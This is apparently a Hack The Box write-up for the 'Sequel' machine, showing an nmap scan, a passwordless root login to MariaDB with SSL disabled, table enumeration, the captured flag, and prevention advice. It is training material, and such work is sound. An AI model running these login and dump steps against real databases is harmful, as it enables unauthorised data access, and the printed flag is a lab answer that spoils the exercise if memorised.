# Hack The Box - Sequel (Writeup)

## 🧠 Overview

The *Sequel* machine focuses on **database enumeration and misconfiguration exploitation**.

Key learning:

* Direct interaction with database services
* MySQL/MariaDB enumeration
* Extracting sensitive data from tables

---

## 🔍 Step 1: Enumeration

### Nmap Scan

```bash
nmap -sC -sV <target-ip>
```

### Result:

```text
3306/tcp open  mysql
Version: MariaDB 10.3.27
```

👉 Only one port is open:

* **3306 (MySQL/MariaDB)**

---

## 🧠 Analysis

* No web service (port 80/443 not open)
* Direct database access is possible

👉 Attack surface = **Database service**

---

## ⚔️ Step 2: Initial Access (Foothold)

### Attempt Connection

```bash
mysql -h <target-ip> -u root
```

### Issue Faced

```text
TLS/SSL error: SSL is required, but the server does not support it
```

---

## 🔧 Fix

Disable SSL:

```bash
mysql -h <target-ip> -u root --skip-ssl
```

---

## 🚀 Result

```text
MariaDB [(none)]>
```

👉 Successfully connected **without password**

---

## 🔴 Vulnerability

> Misconfigured database allows **passwordless root access**

---

## ⚔️ Step 3: Database Enumeration

### List Databases

```sql
SHOW databases;
```

### Output:

```text
htb
information_schema
mysql
performance_schema
```

---

## 🧠 Analysis

👉 `htb` database is likely target

---

## ⚔️ Step 4: Select Database

```sql
USE htb;
```

---

## ⚔️ Step 5: Enumerate Tables

```sql
SHOW tables;
```

### Output:

```text
config
users
```

---

## ⚔️ Step 6: Extract Data

### Check config table:

```sql
SELECT * FROM config;
```

---

## 🎯 Result

```text
flag | 7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## 🏆 Flag

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## 🧠 Key Learnings

* Not all targets are web-based
* Always scan for open services
* Misconfigured services can give direct access
* SQL enumeration is a critical skill

---

## 🔐 OWASP Mapping

* A05: Security Misconfiguration

---

## 🛡️ Prevention

* Disable remote root login
* Enforce strong authentication
* Restrict database access via firewall
* Use SSL properly configured

---

## 🏁 Conclusion

The machine demonstrates how a simple misconfiguration:

> 🔴 Passwordless database access

can lead to complete data exposure.

---

## 🔥 Real-World Insight

In real environments:

* Databases are often exposed internally
* Misconfigurations like this are common in staging environments

---
